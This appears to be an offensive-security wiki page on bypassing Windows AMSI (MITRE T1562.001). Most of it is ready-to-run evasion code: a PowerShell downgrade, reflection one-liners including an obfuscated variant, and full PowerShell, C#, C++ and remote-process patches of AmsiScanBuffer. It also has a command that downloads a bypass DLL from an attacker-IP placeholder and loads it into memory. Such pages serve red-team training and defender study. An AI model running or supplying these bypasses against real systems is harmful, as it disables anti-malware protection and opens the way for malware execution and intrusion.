---
description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.001'
---

# AMSI Bypass

## Theory

With the release of PowerShell, Microsoft released [AMSI (Anti-Malware Scan Interface)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). It is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.

### How it works ?

AMSI (Anti-Malware Scan Interface) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. The [CLR (Common Language Runtime)](https://learn.microsoft.com/en-us/dotnet/standard/clr) and [DLR (Dynamic Language Runtime)](https://learn.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview) are the runtimes for .NET.

AMSI is fully integrated into the following Windows components:

* User Account Control, or UAC
* PowerShell
* Windows Script Host (wscript and cscript)
* JavaScript and VBScript
* Office VBA macros

The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being instrumented.\


<figure><img src="../../../.gitbook/assets/35e16d45ce27145fcdf231fdb8dcb35e.png" alt="" width="563"><figcaption></figcaption></figure>

This is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below.\


<figure><img src="../../../.gitbook/assets/efca9438e858f0476a4ffd777c36501a.png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Note: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented.
{% endhint %}

## Practice

To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/cobbr/InsecurePowerShell) maintained by [Cobbr](https://github.com/cobbr) which is a GitHub fork of PowerShell with security feature removed, and compare it with an [offical PowerShell GitHub](https://github.com/PowerShell/PowerShell).

### PowerShell Downgrade

The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.\
Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By "downgrading" the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.

{% tabs %}
{% tab title="Powershell" %}
We can simply use this command to downgrad powershell. This attacked is used in popular tools such as [Unicorn](https://github.com/trustedsec/unicorn)

```bash
PowerShell -Version 2
```

{% hint style="danger" %}
Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.
{% endhint %}
{% endtab %}
{% endtabs %}

### PowerShell Reflection

Reflection allows a user or administrator to access and interact with .NET assemblies. It can be abused to modify and identify information from valuable DLLs.\
The AMSI utilities for PowerShell are stored in the **AMSIUtils** .NET assembly located in **System.Management.Automation.AmsiUtils**.

{% tabs %}
{% tab title="Powershell" %}
Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.

```bash
# One-liner
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Win10 One-liner
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Win10 & Win11 One-liner
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endtab %}
{% endtabs %}

### Patching AMSI

AMSI is primarily instrumented and loaded from **amsi.dll**. This dll can be abused and forced to point to a response code we want. The **AmsiScanBuffer** function provides us the hooks and functionality we need to access the pointer/buffer for the response code.\
AmsiScanBuffer is vulnerable because amsi.dll is loaded into the PowerShell process at startup; our session has the same permission level as the utility. AmsiScanBuffer will scan a "buffer" of suspected code and report it to amsi.dll to determine the response. We can control this function and overwrite the buffer with a clean return code.

At a high-level AMSI patching can be broken up into four steps,

* Obtain handle of amsi.dll
* Get process address of AmsiScanBuffer
* Modify memory protections of AmsiScanBuffer
* Write opcodes to AmsiScanBuffer

{% tabs %}
{% tab title="PowerShell" %}
Using following powershell code, we can patch AMSI memory for current shell.

```powershell
$MethodDefinition = "
    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

#Load the API calls
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;

#Identify where amsi.dll is located and how to get to the function
$handle = [Win32.Kernel32]::GetModuleHandle(
	'amsi.dll' # Obtains handle to amsi.dll
);

#Get address off AmsiScanBuffer
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer');

#Modify the memory protection of the AmsiScanBuffer process region.
[UInt32]$Size = 0x5; # Size of region
[UInt32]$ProtectFlag = 0x40; # PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; # Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag); 

#Overwrite the buffer
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf,0, $BufferAddress, 6); 
```
{% endtab %}

{% tab title="C# DLL Loading " %}
We can patch AMSI memory using the following `C#` code. We need to build the DLL, then load the Assembly using Reflection, then call function that patch AMSI as follow:

{% code title="AMSIBypass.cs" %}
```csharp
using System;
using System.Runtime.InteropServices;

//Code stolen from @cyguider
namespace Do
{
    public class The
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void copy(Byte[] Patch, IntPtr Address)
        {
            Marshal.Copy(Patch, 0, Address, 6);
        }

        public static void thing()
        {
            IntPtr Library = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
            IntPtr Address = GetProcAddress(Library, "Amsi" + "Scan" + "Buffer");
            uint p;
            VirtualProtect(Address, (UIntPtr)5, 0x40, out p);
            
            //x64 Patch
            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            
            //x86 Patch
            //Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            
            copy(Patch, Address);
            Console.WriteLine("Patch Applied");
        }
    }
}
```
{% endcode %}

We can compile it from our Linux host using mcs:

```bash
#apt-get install mono-mcs
$ mcs -t:library AMSIBypass.cs
```

Then we can transfer the DLL to the target (using http-server, or smb for example) and load the Assembly

```powershell
#Load assembly from memory
$data=(New-Object Net.Webclient).DownloadData('http://<ATTACKING_IP>/AMSIBypass.dll')
[System.Reflection.Assembly]::Load($data)

#Load assembly from disk
PS> [System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes(".\AMSIBypass.dll"))
```

Call function that patch AMSI

```powershell
PS> [Do.The]::thing()
Patched Applied
```
{% endtab %}

{% tab title="C++ DLL Loading" %}
We can patch AMSI memory using the following `C++` code. We need to build the DLL, then load the Assembly using Reflection, then call function that patch AMSI as follow:

{% code title="AMSIBypassC.cpp" %}
```cpp
#include <windows.h>

int DoIt(){	
	HMODULE amsiDllHandle = ::LoadLibraryW(L"amsi.dll");
	FARPROC addr = ::GetProcAddress(amsiDllHandle, "AmsiScanBuffer");
	
	//x64
	BYTE patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
	
	//x86
	//BYTE patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
	
	HANDLE processHandle = ::GetCurrentProcess();
	::WriteProcessMemory(processHandle,(PVOID)addr, (PVOID)patch, (SIZE_T)6, (SIZE_T *)nullptr);
    return(0);
}

int __stdcall DllMain(handle_t hmod, int reason, void *reserved){
  if (reason == DLL_PROCESS_ATTACH) {
    DoIt();
    } 
    return(0);
}
```
{% endcode %}

We can compile it from our Linux host using mingw32:

```bash
x86_64-w64-mingw32-gcc amsiBypassC.cpp -shared -o output.dll
```

Then we can transfer the DLL to the target (using http-server, or smb for example) and load the Assembly

```powershell
#Define the MemberDefinition
PS> $MemberDef = @'
>> [DllImport("amsic.dll")]
>> public static extern void DoIt();
>> '@

#Load the DLL
Add-Type -MemberDefinition $MemberDef -Name 'amsic' -Namespace 'v' -PassThru;
```

Call function that patch AMSI

```powershell
PS> [v.amsic]::DoIt()
```

{% hint style="danger" %}
Even if you get the following error: (Exception de HRESULT : 0x8007045A). The patch may have worked.
{% endhint %}
{% endtab %}

{% tab title="Remote Process Patching (C#)" %}
Following code use same techniques but on a remote process. It use `GetProcessesByName` to gain an handle on the remote process.

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace bypasstest
{
    class Program
    {
        public enum Protection : uint
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string ddltoLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, Protection flNewProtect, IntPtr lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, Protection flNewProtect, IntPtr lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = false)]
        private static unsafe extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, int nSize);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        //allow us to catch a System.AccessViolationException in managed code and continue
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        static void Main(string[] args)
        {
            IntPtr dllHandle = LoadLibrary("amsi.dll"); //load the amsi.dll
            if (dllHandle == null) return;

            //Get the AmsiScanBuffer function address
            IntPtr AmsiScanbufferAddr = GetProcAddress(dllHandle, "AmsiScanBuffer");
            if (AmsiScanbufferAddr == null) return;

            Process targetProcess = Process.GetProcessesByName("powershell")[0];
            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, targetProcess.Id);

            IntPtr OldProtection = Marshal.AllocHGlobal(4); //pointer to store the current AmsiScanBuffer memory protection

            //Pointer changing the AmsiScanBuffer memory protection from readable only to writeable (0x40)
            bool VirtualProtectRc = VirtualProtectEx(procHandle, AmsiScanbufferAddr, 0x0015, Protection.PAGE_EXECUTE_READWRITE, OldProtection);
            if (VirtualProtectRc == false) return;

            //X64 Patch
            var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            //X86 Patch
            //var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };


            //Setting a pointer to the patch opcode array (unmanagedPointer)
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(patch, 0, unmanagedPointer, 3);
            try
            {
                //Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
                WriteProcessMemory(procHandle, AmsiScanbufferAddr + 0x001b, unmanagedPointer, 3);
            }
            catch
            {
                //silent continue
            }
        }
    }
}
```
{% endtab %}
{% endtabs %}

### AMSI Bypass Tools

While it is preferred to use the previous methods shown, attackers can use other automated tools to break AMSI signatures or compile a bypass.

{% tabs %}
{% tab title="AMSI.Fail" %}
[amsi.fail](https://amsi.fail/) will compile and generate a PowerShell bypass from a collection of known bypasses.\
From amsi.fail, "AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before obfuscating. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures."
{% endtab %}

{% tab title="Evil-Winrm" %}
If we can access the target through WinRM, we can use the built-in `Bypass-4MSI` command to patch the AMSI protection.

```powershell
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!
```
{% endtab %}

{% tab title="AMSITrigger" %}
[AMSITrigger](https://github.com/RythmStick/AMSITrigger) allows attackers to automatically identify strings that are flagging signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.

```bash
C:\Users\v4resk\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
```
{% endtab %}

{% tab title="AMSI-Killer" %}
We can use the [AMSI-KIller](https://github.com/ZeroMemoryEx/Amsi-Killer) tools that is a `C++` implementation of the AMSI memory patch. It search powershell process and patch the `AmsiOpenSession` function.

```
cmd >  Amsi-Killer.exe 
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/runtimedetectionevasion" %}
